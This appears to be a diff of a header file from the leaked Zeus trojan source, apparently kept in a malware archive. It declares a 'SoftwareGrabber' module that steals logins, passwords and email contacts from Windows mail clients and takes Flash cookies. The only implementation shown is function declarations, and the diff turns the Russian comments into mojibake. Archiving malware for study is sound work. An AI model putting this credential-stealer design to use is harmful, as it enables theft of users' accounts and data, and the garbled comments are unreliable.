@@ -1,44 +1,55 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #pragma once
 /*
-  Граббер логинов/паролий и т.д. из различного ПО.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ/пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅ.пїЅ. пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ.
 */
 namespace SoftwareGrabber
 {
   /*
-    Инициализация.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   */
   void init(void);
 
   /*
-    Деинициализация.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   */
   void uninit(void);
 
   /*
-    Поулчение "куков" от Macromedia(Adobe) Flash Player.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ "пїЅпїЅпїЅпїЅпїЅ" пїЅпїЅ Macromedia(Adobe) Flash Player.
   */
   void _getMacromediaFlashFiles(void);
 
   /*
-    Удаление "куков" от Macromedia(Adobe) Flash Player.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ "пїЅпїЅпїЅпїЅпїЅ" пїЅпїЅ Macromedia(Adobe) Flash Player.
   */
   void _removeMacromediaFlashFiles(void);
 
 #if(BO_SOFTWARE_EMAIL > 0)  
   
   /*
-    Граббер получателей из Windows Mail/Outlook Express.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ Windows Mail/Outlook Express.
   */
   void _emailWindowsMailRecipients(void);
   
   /*
-    Граббер логинов из Outlook Express.
-    Теряеть актуальность вместе с XP.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ Outlook Express.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ XP.
   */
   void _emailOutlookExpress(void);
 
   /*
-    Граббер логинов из Windows Mail/Windows Live Mail.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ Windows Mail/Windows Live Mail.
 
     IN live - true - Windows Live Mail,
               false - Windows Mail.
@@ -46,21 +57,21 @@ namespace SoftwareGrabber
   void _emailWindowsMail(bool live);
   
   /*
-    Получение email'ов из Windows Address Book. Получение проихоид из всех групп, папок, и
-    идентификаторов адресной книги текущего пользователя.
-    Теряеть актуальность вместе с XP.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ email'пїЅпїЅ пїЅпїЅ Windows Address Book. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ, пїЅ
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ XP.
   */
   void _emailWindowsAddressBook(void);
 
   /*
-    Получение email'ов из Windows Contacts.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ email'пїЅпїЅ пїЅпїЅ Windows Contacts.
   */
   void _emailWindowsContacts(void);
 
   /*
-    Обработка всех E-mail-клиентов.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ E-mail-пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-    Требует ComLibrary.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅ ComLibrary.
   */
   void _emailAll(void);
 #endif
